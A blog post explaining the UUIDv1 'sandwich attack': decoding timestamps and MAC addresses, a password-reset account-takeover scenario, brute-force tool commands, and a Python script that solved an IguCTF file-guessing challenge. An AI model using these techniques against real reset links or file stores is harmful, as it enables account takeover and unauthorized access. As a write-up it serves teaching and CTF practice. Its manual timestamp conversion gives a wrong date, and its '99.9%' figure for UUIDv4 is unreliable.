---
title: "UUID Sandwich Exploitation"
layout: post
---

### UUID Sandwich Attack – Version 1

A **UUID** (Universally Unique Identifier), also known as **GUID**, has both vulnerable versions and stronger iterations that have emerged over time. These randomly generated unique values are produced at micro- or nanosecond precision. Although the chance of duplication is extremely low, it is never truly zero. Identical values *can* be generated, though detecting them is extremely difficult. The probability of duplication is low but never zero.

**Example UUID**:  
```
f81d4fae-7dec-11d0-a765-00a0c91e6bf6
```

### Exploitation

The **Sandwich Attack** usually appears in **UUID version 1**, which relies on time and MAC address for generation. This can lead to vulnerabilities such as **Account Takeover, BOLA, or IDOR**. UUIDv1 values produced within the same timestamp can be duplicated, enabling exploitation.

On Linux, you can generate values with the `uuid` command.

UUID v1: `6ea0f896-3144-11ef-a367-005056260027` & `6f03f496-3144-11ef-86bc-005056260027`  
Here, the values `a367` and `86bc` differ, but the MAC portion `005056260027` remains constant.

UUID v4: `60a0cf20-f5a8-4ea2-9469-d4269f0a5bc8` & `62f4a612-6d64-48a2-a271-26217702999e`  
Here the difference is complete. UUIDv4 offers ~99.9% safety, but UUIDv1 significantly increases risk.

For exploitation, see Burp Suite extension:  
https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248  

Also reference: https://datatracker.ietf.org/doc/html/rfc4122  

![uuidv1](/assets/images/uuidv1.png)

### 10 Sequential Generations

```js
f2c6e440-3145-11ef-8465-0800200c9a66
f2c6e441-3145-11ef-8465-0800200c9a66
f2c6e442-3145-11ef-8465-0800200c9a66
f2c6e443-3145-11ef-8465-0800200c9a66
f2c6e444-3145-11ef-8465-0800200c9a66
f2c6e445-3145-11ef-8465-0800200c9a66
f2c6e446-3145-11ef-8465-0800200c9a66
f2c6e447-3145-11ef-8465-0800200c9a66
f2c6e448-3145-11ef-8465-0800200c9a66
f2c6e449-3145-11ef-8465-0800200c9a66
```

As seen, time is highly sensitive:

`Timestamp: 139384289967400006`  
`Timestamp: 139384289967400007`  

The changing part `f2c6e447-3145-11ef` encodes the time. The MAC portion `08:00:20:0c:9a:66` often remains static.

### UUID Extraction

Example UUID: `5c1dba54-ee3e-11ee-a951-0242ac120002`  
Time portion: `1eeee3e5c1dba54`  

![uuid extract](/assets/images/UUID2.jpg)

Decode timestamp:  

```js
printf "%d\n" 0x1eeee3e5c1dba54
139310590095899220
```

Convert to decimal:  

```sh
echo "scale=9; 139310590095899220 / 10^8" | bc
1393105900.958992200
```

This corresponds to Epoch time `Saturday, 30 March 2024 02:36:49`.  

Using GuidReaper:  

```js
GuidReaper -d "5c1dba54-ee3e-11ee-a951-0242ac120002"
GUID version: 1
Time: 2024-03-30 02:36:49.589922
Timestamp: 139310590095899220
Node: 2485377957890
MAC address: 02:42:ac:12:00:02
Clock sequence: 10577
```

Reverse engineering UUIDv1 allows exploitation using **Time Manipulation**.

### Exploitation Scenario

1. Suppose the system generates a password reset link using UUID.  
2. Attacker account: `uuid@attack.com`, victim account: `victim@attack.com`.  
3. Both trigger password reset at the same time.  

Victim link:  

```php
https://server/reset_password?reset=dc464b70-314a-11ef-8465-0800200c9a66&user=victim@attack.com
```  
Time: 2024-06-23 10:25:06.471000  

Attacker link:  

```php
https://server/reset_password?reset=de7a4270-314a-11ef-8465-0800200c9a66&user=uuid@attack.com
```  
Time: 2024-06-23 10:25:10.167000  

A 4-second difference shows how concurrency flaws could enable account takeover.  

With GuidTool, UUIDs can be generated for specific timestamps:  

```js
guidtool.py 667b8570-0d84-11ef-9ed0-0800200c9a66 -t "1923-10-29 20:30:00" -p 1 
```

This produces many values for a target time. Such weaknesses can lead to **BOLA**, **IDOR**, or **Account Takeover**.  

See: [Uuid-Exploitation](https://github.com/cagrieser/Uuid-Exploitation)  

### CTF Scenario

In an IguCTF challenge, we exploited UUIDv1 Sandwich to access unauthorized files and retrieve a flag.  

![igu cyber](/assets/images/IguCyber.png)

Hashing filenames locally avoids server overload. Example script:  

```py
import hashlib
from colorama import init, Fore
import PyPDF2
import requests
import io 

init(autoreset=True)

target_hash = 'def3c4c32117683fcffad14e3b2a9b5d'

def md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

def get_pdf_metadata_from_url(pdf_url):
    response = requests.get(pdf_url)
    if response.status_code == 200:
        pdf_content = response.content
        pdf_file = PyPDF2.PdfFileReader(io.BytesIO(pdf_content))
        return pdf_file.getDocumentInfo()
    return None

with open('FullAttackUUID.txt', 'r') as file:
    for line in file:
        filename = line.strip() + '.pdf'
        if md5_hash(filename) == target_hash:
            print(Fore.GREEN + f"Match found: {filename}")
            url = f"https://demindensimdiyegeldim.igusiber.com.tr/{filename}"
            metadata = get_pdf_metadata_from_url(url)
            if metadata:
                for key, value in metadata.items():
                    print(f"{key}: {value}")
            break
```

### Final

UUIDv1 is predictable due to timestamps and MAC addresses, making it exploitable. UUIDv4 is safer, but UUIDv1 remains in use, creating risks.

![exp](/assets/images/exp.png)  
